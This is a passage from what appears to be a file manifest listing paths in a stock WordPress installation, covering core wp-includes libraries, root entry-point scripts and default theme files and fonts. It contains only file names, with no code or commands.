    "wp-includes/SimplePie/library/SimplePie/gzdecode.php",
    "wp-includes/SimplePie/library/SimplePie/Locator.php",
    "wp-includes/SimplePie/library/SimplePie/Rating.php",
    "wp-includes/SimplePie/library/SimplePie/Copyright.php",
    "wp-includes/SimplePie/library/SimplePie/Credit.php",
    "wp-includes/SimplePie/library/SimplePie/Caption.php",
    "wp-includes/SimplePie/library/SimplePie/File.php",
    "wp-includes/SimplePie/library/SimplePie/Enclosure.php",
    "wp-includes/SimplePie/library/SimplePie/Parse/Date.php",
    "wp-includes/SimplePie/library/SimplePie/Decode/HTML/Entities.php",
    "wp-includes/SimplePie/library/SimplePie/XML/Declaration/Parser.php",
    "wp-includes/SimplePie/library/SimplePie/Exception.php",
    "wp-includes/SimplePie/library/SimplePie/Core.php",
    "wp-includes/SimplePie/library/SimplePie/Cache.php",
    "wp-includes/SimplePie/library/SimplePie/Restriction.php",
    "wp-includes/SimplePie/library/SimplePie/Sanitize.php",
    "wp-includes/SimplePie/library/SimplePie/IRI.php",
    "wp-includes/SimplePie/library/SimplePie/Misc.php",
    "wp-includes/SimplePie/autoloader.php",
    "wp-includes/class-wp-error.php",
    "wp-includes/PHPMailer/SMTP.php",
    "wp-includes/PHPMailer/Exception.php",
    "wp-includes/PHPMailer/PHPMailer.php",
    "wp-includes/class-wp-object-cache.php",
    "wp-includes/class-wp-tax-query.php",
    "wp-includes/class-wp-term-query.php",
    "wp-includes/class-wp-block-list.php",
    "wp-includes/default-widgets.php",
    "wp-includes/class-wp-text-diff-renderer-table.php",
    "wp-includes/post-thumbnail-template.php",
    "wp-includes/comment.php",
    "wp-includes/https-migration.php",
    "wp-includes/block-bindings.php",
    "wp-includes/class-wp-oembed.php",
    "wp-includes/sodium_compat/src/Compat.php",
    "wp-includes/sodium_compat/src/Core/Ed25519.php",
    "wp-includes/sodium_compat/src/Core/AEGIS256.php",
    "wp-includes/sodium_compat/src/Core/Curve25519.php",
    "wp-includes/sodium_compat/src/Core/XSalsa20.php",
    "wp-includes/sodium_compat/src/Core/AES/Block.php",
    "wp-includes/sodium_compat/src/Core/AES/KeySchedule.php",
    "wp-includes/sodium_compat/src/Core/AES/Expanded.php",
    "wp-includes/sodium_compat/src/Core/AES.php",
    "wp-includes/sodium_compat/src/Core/Util.php",
    "wp-includes/sodium_compat/src/Core/AEGIS128L.php",
    "wp-includes/sodium_compat/src/Core/ChaCha20.php",
    "wp-includes/sodium_compat/src/Core/Curve25519/Fe.php",
    "wp-includes/sodium_compat/src/Core/Curve25519/README.md",
    "wp-includes/sodium_compat/src/Core/Curve25519/H.php",
    "wp-includes/sodium_compat/src/Core/Curve25519/Ge/Precomp.php",
    "wp-includes/sodium_compat/src/Core/Curve25519/Ge/P2.php",
    "wp-includes/sodium_compat/src/Core/Curve25519/Ge/P1p1.php",
    "wp-includes/sodium_compat/src/Core/Curve25519/Ge/P3.php",
    "wp-includes/sodium_compat/src/Core/Curve25519/Ge/Cached.php",
    "wp-includes/sodium_compat/src/Core/XChaCha20.php",
    "wp-includes/sodium_compat/src/Core/HSalsa20.php",
    "wp-includes/sodium_compat/src/Core/ChaCha20/Ctx.php",
    "wp-includes/sodium_compat/src/Core/ChaCha20/IetfCtx.php",
    "wp-includes/sodium_compat/src/Core/BLAKE2b.php",
    "wp-includes/sodium_compat/src/Core/Salsa20.php",
    "wp-includes/sodium_compat/src/Core/Poly1305/State.php",
    "wp-includes/sodium_compat/src/Core/X25519.php",
    "wp-includes/sodium_compat/src/Core/Base64/Original.php",
    "wp-includes/sodium_compat/src/Core/Base64/UrlSafe.php",
    "wp-includes/sodium_compat/src/Core/Poly1305.php",
    "wp-includes/sodium_compat/src/Core/HChaCha20.php",
    "wp-includes/sodium_compat/src/Core/Ristretto255.php",
    "wp-includes/sodium_compat/src/Core/AEGIS/State256.php",
    "wp-includes/sodium_compat/src/Core/AEGIS/State128L.php",
    "wp-includes/sodium_compat/src/Core/SipHash.php",
    "wp-includes/sodium_compat/src/Core/SecretStream/State.php",
    "wp-includes/sodium_compat/src/SodiumException.php",
    "wp-includes/sodium_compat/src/Crypto32.php",
    "wp-includes/sodium_compat/src/Crypto.php",
    "wp-includes/sodium_compat/src/File.php",
    "wp-includes/sodium_compat/src/Core32/Ed25519.php",
    "wp-includes/sodium_compat/src/Core32/Curve25519.php",
    "wp-includes/sodium_compat/src/Core32/XSalsa20.php",
    "wp-includes/sodium_compat/src/Core32/Util.php",
    "wp-includes/sodium_compat/src/Core32/ChaCha20.php",
    "wp-includes/sodium_compat/src/Core32/Curve25519/Fe.php",
    "wp-includes/sodium_compat/src/Core32/Curve25519/README.md",
    "wp-includes/sodium_compat/src/Core32/Curve25519/H.php",
    "wp-includes/sodium_compat/src/Core32/Curve25519/Ge/Precomp.php",
    "wp-includes/sodium_compat/src/Core32/Curve25519/Ge/P2.php",
    "wp-includes/sodium_compat/src/Core32/Curve25519/Ge/P1p1.php",
    "wp-includes/sodium_compat/src/Core32/Curve25519/Ge/P3.php",
    "wp-includes/sodium_compat/src/Core32/Curve25519/Ge/Cached.php",
    "wp-includes/sodium_compat/src/Core32/XChaCha20.php",
    "wp-includes/sodium_compat/src/Core32/HSalsa20.php",
    "wp-includes/sodium_compat/src/Core32/ChaCha20/Ctx.php",
    "wp-includes/sodium_compat/src/Core32/ChaCha20/IetfCtx.php",
    "wp-includes/sodium_compat/src/Core32/BLAKE2b.php",
    "wp-includes/sodium_compat/src/Core32/Int64.php",
    "wp-includes/sodium_compat/src/Core32/Salsa20.php",
    "wp-includes/sodium_compat/src/Core32/Poly1305/State.php",
    "wp-includes/sodium_compat/src/Core32/X25519.php",
    "wp-includes/sodium_compat/src/Core32/Poly1305.php",
    "wp-includes/sodium_compat/src/Core32/HChaCha20.php",
    "wp-includes/sodium_compat/src/Core32/SipHash.php",
    "wp-includes/sodium_compat/src/Core32/Int32.php",
    "wp-includes/sodium_compat/src/Core32/SecretStream/State.php",
    "wp-includes/sodium_compat/src/PHP52/SplFixedArray.php",
    "wp-includes/sodium_compat/LICENSE",
    "wp-includes/sodium_compat/autoload-php7.php",
    "wp-includes/sodium_compat/composer.json",
    "wp-includes/sodium_compat/namespaced/Compat.php",
    "wp-includes/sodium_compat/namespaced/Core/Ed25519.php",
    "wp-includes/sodium_compat/namespaced/Core/Curve25519.php",
    "wp-includes/sodium_compat/namespaced/Core/Util.php",
    "wp-includes/sodium_compat/namespaced/Core/ChaCha20.php",
    "wp-includes/sodium_compat/namespaced/Core/Curve25519/Fe.php",
    "wp-includes/sodium_compat/namespaced/Core/Curve25519/H.php",
    "wp-includes/sodium_compat/namespaced/Core/Curve25519/Ge/Precomp.php",
    "wp-includes/sodium_compat/namespaced/Core/Curve25519/Ge/P2.php",
    "wp-includes/sodium_compat/namespaced/Core/Curve25519/Ge/P1p1.php",
    "wp-includes/sodium_compat/namespaced/Core/Curve25519/Ge/P3.php",
    "wp-includes/sodium_compat/namespaced/Core/Curve25519/Ge/Cached.php",
    "wp-includes/sodium_compat/namespaced/Core/XChaCha20.php",
    "wp-includes/sodium_compat/namespaced/Core/HSalsa20.php",
    "wp-includes/sodium_compat/namespaced/Core/Xsalsa20.php",
    "wp-includes/sodium_compat/namespaced/Core/ChaCha20/Ctx.php",
    "wp-includes/sodium_compat/namespaced/Core/ChaCha20/IetfCtx.php",
    "wp-includes/sodium_compat/namespaced/Core/BLAKE2b.php",
    "wp-includes/sodium_compat/namespaced/Core/Salsa20.php",
    "wp-includes/sodium_compat/namespaced/Core/Poly1305/State.php",
    "wp-includes/sodium_compat/namespaced/Core/X25519.php",
    "wp-includes/sodium_compat/namespaced/Core/Poly1305.php",
    "wp-includes/sodium_compat/namespaced/Core/HChaCha20.php",
    "wp-includes/sodium_compat/namespaced/Core/SipHash.php",
    "wp-includes/sodium_compat/namespaced/Crypto.php",
    "wp-includes/sodium_compat/namespaced/File.php",
    "wp-includes/sodium_compat/lib/ristretto255.php",
    "wp-includes/sodium_compat/lib/php72compat.php",
    "wp-includes/sodium_compat/lib/sodium_compat.php",
    "wp-includes/sodium_compat/lib/stream-xchacha20.php",
    "wp-includes/sodium_compat/lib/constants.php",
    "wp-includes/sodium_compat/lib/php84compat.php",
    "wp-includes/sodium_compat/lib/php84compat_const.php",
    "wp-includes/sodium_compat/lib/namespaced.php",
    "wp-includes/sodium_compat/lib/php72compat_const.php",
    "wp-includes/sodium_compat/autoload.php",
    "wp-includes/date.php",
    "wp-includes/class-wp-application-passwords.php",
    "wp-includes/l10n/class-wp-translation-controller.php",
    "wp-includes/l10n/class-wp-translation-file.php",
    "wp-includes/l10n/class-wp-translation-file-mo.php",
    "wp-includes/l10n/class-wp-translations.php",
    "wp-includes/l10n/class-wp-translation-file-php.php",
    "wp-includes/class-wp-block-patterns-registry.php",
    "wp-includes/pluggable.php",
    "wp-includes/theme.json",
    "wp-includes/post-formats.php",
    "wp-includes/category.php",
    "wp-includes/capabilities.php",
    "wp-includes/functions.wp-styles.php",
    "wp-includes/class-walker-comment.php",
    "wp-includes/class-wp-site-query.php",
    "wp-includes/style-engine.php",
    "wp-includes/class-wp-classic-to-block-menu-converter.php",
    "wp-includes/class-wp-simplepie-sanitize-kses.php",
    "wp-includes/taxonomy.php",
    "wp-includes/class-wp-network.php",
    "wp-includes/class-walker-category.php",
    "wp-includes/block-bindings/pattern-overrides.php",
    "wp-includes/block-bindings/post-meta.php",
    "wp-includes/class-wp-block-metadata-registry.php",
    "wp-includes/class-wp-http-curl.php",
    "wp-includes/class-wp-ajax-response.php",
    "wp-includes/class-wp-url-pattern-prefixer.php",
    "wp-includes/fonts/dashicons.woff",
    "wp-includes/fonts/dashicons.ttf",
    "wp-includes/fonts/dashicons.svg",
    "wp-includes/fonts/dashicons.woff2",
    "wp-includes/fonts/class-wp-font-face.php",
    "wp-includes/fonts/class-wp-font-face-resolver.php",
    "wp-includes/fonts/dashicons.eot",
    "wp-includes/fonts/class-wp-font-collection.php",
    "wp-includes/fonts/class-wp-font-library.php",
    "wp-includes/fonts/class-wp-font-utils.php",
    "wp-includes/embed-template.php",
    "wp-includes/theme.php",
    "wp-includes/feed-atom-comments.php",
    "wp-includes/class-wp-paused-extensions-storage.php",
    "wp-includes/class-wp-meta-query.php",
    "wp-includes/class-wp-role.php",
    "wp-includes/class-wp-image-editor-gd.php",
    "wp-includes/theme-i18n.json",
    "wp-includes/rss.php",
    "wp-includes/load.php",
    "wp-includes/class-wp-walker.php",
    "wp-includes/class-wp-recovery-mode.php",
    "wp-includes/nav-menu-template.php",
    "wp-includes/IXR/class-IXR-introspectionserver.php",
    "wp-includes/IXR/class-IXR-error.php",
    "wp-includes/IXR/class-IXR-base64.php",
    "wp-includes/IXR/class-IXR-clientmulticall.php",
    "wp-includes/IXR/class-IXR-request.php",
    "wp-includes/IXR/class-IXR-date.php",
    "wp-includes/IXR/class-IXR-client.php",
    "wp-includes/IXR/class-IXR-server.php",
    "wp-includes/IXR/class-IXR-message.php",
    "wp-includes/IXR/class-IXR-value.php",
    "wp-includes/class-wp-user-meta-session-tokens.php",
    "wp-includes/class-wp-simplepie-file.php",
    "wp-includes/class-pop3.php",
    "wp-includes/class-wp-theme-json-schema.php",
    "wp-includes/class-oembed.php",
    "wp-includes/class-wp-plugin-dependencies.php",
    "wp-includes/theme-compat/comments.php",
    "wp-includes/theme-compat/footer-embed.php",
    "wp-includes/theme-compat/header-embed.php",
    "wp-includes/theme-compat/footer.php",
    "wp-includes/theme-compat/embed-content.php",
    "wp-includes/theme-compat/embed.php",
    "wp-includes/theme-compat/header.php",
    "wp-includes/theme-compat/sidebar.php",
    "wp-includes/theme-compat/embed-404.php",
    "wp-includes/class-walker-category-dropdown.php",
    "wp-includes/class-walker-nav-menu.php",
    "wp-includes/class-wp-block-parser-frame.php",
    "wp-includes/class-wp-speculation-rules.php",
    "wp-includes/class-wp-navigation-fallback.php",
    "wp-includes/class.wp-styles.php",
    "wp-includes/class-wp-block-bindings-registry.php",
    "wp-includes/class-wp-list-util.php",
    "wp-includes/class-wp-block-supports.php",
    "wp-includes/class-wp-recovery-mode-link-service.php",
    "wp-includes/class-wp-post-type.php",
    "wp-includes/class.wp-scripts.php",
    "wp-includes/error-protection.php",
    "wp-includes/class-wp-theme-json-data.php",
    "wp-includes/rest-api.php",
    "wp-includes/class-wp-metadata-lazyloader.php",
    "wp-includes/class-wp-customize-setting.php",
    "wp-includes/class-wp-text-diff-renderer-inline.php",
    "wp-includes/block-editor.php",
    "wp-includes/class-wp-styles.php",
    "wp-includes/block-patterns.php",
    "wp-includes/class-wp-feed-cache.php",
    "wp-includes/class-wp-customize-widgets.php",
    "wp-includes/php-compat/readonly.php",
    "wp-includes/class-wp-widget.php",
    "wp-includes/class-wp.php",
    "wp-includes/nav-menu.php",
    "wp-includes/class-wp-dependencies.php",
    "wp-includes/class-wp-post.php",
    "wp-includes/theme-previews.php",
    "wp-includes/class-wp-phpmailer.php",
    "wp-includes/class-wp-term.php",
    "wp-includes/Text/Diff/Engine/shell.php",
    "wp-includes/Text/Diff/Engine/xdiff.php",
    "wp-includes/Text/Diff/Engine/string.php",
    "wp-includes/Text/Diff/Engine/native.php",
    "wp-includes/Text/Diff/Renderer/inline.php",
    "wp-includes/Text/Diff/Renderer.php",
    "wp-includes/Text/Diff.php",
    "wp-includes/Text/Exception.php",
    "wp-includes/category-template.php",
    "wp-includes/post-template.php",
    "wp-includes/template-loader.php",
    "wp-includes/deprecated.php",
    "wp-includes/class-simplepie.php",
    "wp-includes/post.php",
    "wp-includes/spl-autoload-compat.php",
    "wp-includes/canonical.php",
    "wp-includes/class-wp-site.php",
    "wp-includes/class-wp-customize-nav-menus.php",
    "wp-includes/class-wp-block-type.php",
    "wp-includes/rewrite.php",
    "wp-includes/class-wp-customize-manager.php",
    "wp-includes/class-phpmailer.php",
    "wp-includes/registration.php",
    "wp-includes/speculative-loading.php",
    "wp-links-opml.php",
    "wp-load.php",
    "wp-comments-post.php",
    "wp-blog-header.php",
    "xmlrpc.php",
    "wp-login.php",
    "wp-mail.php",
    "wp-content/themes/twentytwentytwo/readme.txt",
    "wp-content/themes/twentytwentytwo/assets/videos/birds.mp4",
    "wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.otf.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.otf.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/ibm-plex/IBMPlexMono-Text.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/ibm-plex/IBMPlexMono-TextItalic.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/ibm-plex/IBMPlexMono-BoldItalic.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/ibm-plex/IBMPlexSans-ExtraLightItalic.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/ibm-plex/IBMPlexSans-LightItalic.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/ibm-plex/IBMPlexMono-Bold.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/ibm-plex/IBMPlexSans-Light.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/ibm-plex/IBMPlexSans-ExtraLight.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/ibm-plex/LICENSE.txt",
    "wp-content/themes/twentytwentytwo/assets/fonts/source-serif-pro/SourceSerif4Variable-Roman.ttf.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/source-serif-pro/SourceSerif4Variable-Italic.otf.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/source-serif-pro/LICENSE.md",
    "wp-content/themes/twentytwentytwo/assets/fonts/source-serif-pro/SourceSerif4Variable-Roman.otf.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/source-serif-pro/SourceSerif4Variable-Italic.ttf.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/dm-sans/DMSans-Regular.ttf",
    "wp-content/themes/twentytwentytwo/assets/fonts/dm-sans/DMSans-Italic.ttf",
    "wp-content/themes/twentytwentytwo/assets/fonts/dm-sans/DMSans-Bold.ttf",
    "wp-content/themes/twentytwentytwo/assets/fonts/dm-sans/DMSans-BoldItalic.ttf",
    "wp-content/themes/twentytwentytwo/assets/fonts/dm-sans/LICENSE.txt",
    "wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2",
    "wp-content/themes/twentytwentytwo/assets/fonts/inter/Inter.ttf",
    "wp-content/themes/twentytwentytwo/assets/fonts/inter/LICENSE.txt",
    "wp-content/themes/twentytwentytwo/parts/header.html",
    "wp-content/themes/twentytwentytwo/parts/footer.html",
    "wp-content/themes/twentytwentytwo/parts/header-small-dark.html",
    "wp-content/themes/twentytwentytwo/parts/header-large-dark.html",
    "wp-content/themes/twentytwentytwo/styles/blue.json",
    "wp-content/themes/twentytwentytwo/styles/pink.json",
    "wp-content/themes/twentytwentytwo/styles/swiss.json",
    "wp-content/themes/twentytwentytwo/functions.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-small-dark.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-about-media-right.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/query-text-grid.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-layout-image-and-text.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-default.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/footer-query-images-title-citation.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/query-default.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-two-images-text.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-list-events.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-centered-title-navigation-social.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-divider-dark.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-about-links-dark.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/hidden-heading-and-bird.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/query-simple-blog.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-stacked.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-image-background-overlay.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/footer-blog.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-text-only-with-tagline-black-background.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-layered-images-with-duotone.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/footer-navigation.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/query-large-titles.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-logo-navigation-offset-tagline.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-with-tagline.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/footer-default.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/footer-title-tagline-social.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-title-and-button.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-text-only-salmon-background.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-wide-image-intro-buttons.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-centered-logo-black-background.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-large-dark.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-about-large-image-and-buttons.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-sidebar-blog-posts.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-logo-navigation-gray-background.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-subscribe.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/query-irregular-grid.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/footer-logo.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-title-navigation-social.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/hidden-bird.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-video-trailer.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-about-links.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-text-only-green-background.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-image-with-caption.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/query-grid.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/hidden-404.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/footer-about-title-logo.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-large-list-names.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-about-simple-dark.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/footer-query-title-citation.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-about-media-left.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-image-background.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/footer-dark.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/query-image-grid.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-featured-posts.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-divider-light.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/footer-navigation-copyright.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-centered-logo.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-sidebar-poster.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-layout-two-columns.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/header-logo-navigation-social-black-background.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-sidebar-blog-posts-right.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-video-header-details.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-about-solid-color.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-layout-image-text-and-video.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/general-pricing-table.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/footer-social-copyright.php",
    "wp-content/themes/twentytwentytwo/inc/patterns/page-sidebar-grid-posts.php",
    "wp-content/themes/twentytwentytwo/inc/block-patterns.php",
    "wp-content/themes/twentytwentytwo/theme.json",
    "wp-content/themes/twentytwentytwo/templates/page-no-separators.html",
    "wp-content/themes/twentytwentytwo/templates/page.html",
    "wp-content/themes/twentytwentytwo/templates/blank.html",
    "wp-content/themes/twentytwentytwo/templates/single-no-separators.html",
    "wp-content/themes/twentytwentytwo/templates/home.html",
    "wp-content/themes/twentytwentytwo/templates/search.html",
    "wp-content/themes/twentytwentytwo/templates/single.html",
    "wp-content/themes/twentytwentytwo/templates/index.html",
    "wp-content/themes/twentytwentytwo/templates/archive.html",
    "wp-content/themes/twentytwentytwo/templates/404.html",
    "wp-content/themes/twentytwentytwo/templates/page-large-header.html",
    "wp-content/themes/twentytwentytwo/index.php",
    "wp-content/themes/twentyten/comments.php",
    "wp-content/themes/twentyten/readme.txt",
    "wp-content/themes/twentyten/loop-page.php",
    "wp-content/themes/twentyten/footer.php",
    "wp-content/themes/twentyten/404.php",
    "wp-content/themes/twentyten/archive.php",
    "wp-content/themes/twentyten/author.php",
    "wp-content/themes/twentyten/page.php",
    "wp-content/themes/twentyten/functions.php",
    "wp-content/themes/twentyten/header.php",
    "wp-content/themes/twentyten/loop.php",
    "wp-content/themes/twentyten/license.txt",
    "wp-content/themes/twentyten/onecolumn-page.php",
    "wp-content/themes/twentyten/sidebar-footer.php",
    "wp-content/themes/twentyten/single.php",
    "wp-content/themes/twentyten/sidebar.php",
    "wp-content/themes/twentyten/attachment.php",
    "wp-content/themes/twentyten/tag.php",
    "wp-content/themes/twentyten/loop-attachment.php",
    "wp-content/themes/twentyten/loop-single.php",
    "wp-content/themes/twentyten/category.php",
    "wp-content/themes/twentyten/languages/twentyten.pot",
    "wp-content/themes/twentyten/search.php",
    "wp-content/themes/twentyten/index.php",
    "wp-content/themes/twentyten/block-patterns.php",
    "wp-content/themes/twentyfifteen/comments.php",
    "wp-content/themes/twentyfifteen/readme.txt",
    "wp-content/themes/twentyfifteen/content-link.php",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-greek-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-latin-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-devanagari-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-cyrillic-ext-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-cyrillic-ext-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-devanagari-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-cyrillic-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-devanagari-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-latin-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-latin-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-latin-ext-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-devanagari-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-vietnamese-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-vietnamese-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-latin-ext-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-all-700-normal.woff",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-cyrillic-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-greek-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-greek-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-cyrillic-ext-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-latin-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-latin-ext-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-vietnamese-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-cyrillic-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-greek-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-all-700-italic.woff",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-all-400-normal.woff",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-cyrillic-ext-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-greek-ext-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-latin-ext-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-vietnamese-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-greek-ext-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-all-400-italic.woff",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-greek-ext-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-greek-ext-700-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/LICENSE.txt",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-sans/noto-sans-cyrillic-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/inconsolata/inconsolata-all-400-normal.woff",
    "wp-content/themes/twentyfifteen/assets/fonts/inconsolata/inconsolata-all-700-normal.woff",
    "wp-content/themes/twentyfifteen/assets/fonts/inconsolata/inconsolata-latin-ext-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/inconsolata/inconsolata-vietnamese-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/inconsolata/inconsolata-vietnamese-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/inconsolata/inconsolata-latin-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/inconsolata/inconsolata-latin-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/inconsolata/LICENSE.txt",
    "wp-content/themes/twentyfifteen/assets/fonts/inconsolata/inconsolata-latin-ext-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-cyrillic-ext-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-latin-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-latin-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-cyrillic-ext-400-italic.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-all-400-italic.woff",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-all-400-normal.woff",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-greek-ext-400-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-cyrillic-700-normal.woff2",
    "wp-content/themes/twentyfifteen/assets/fonts/noto-serif/noto-serif-all-700-italic.woff",
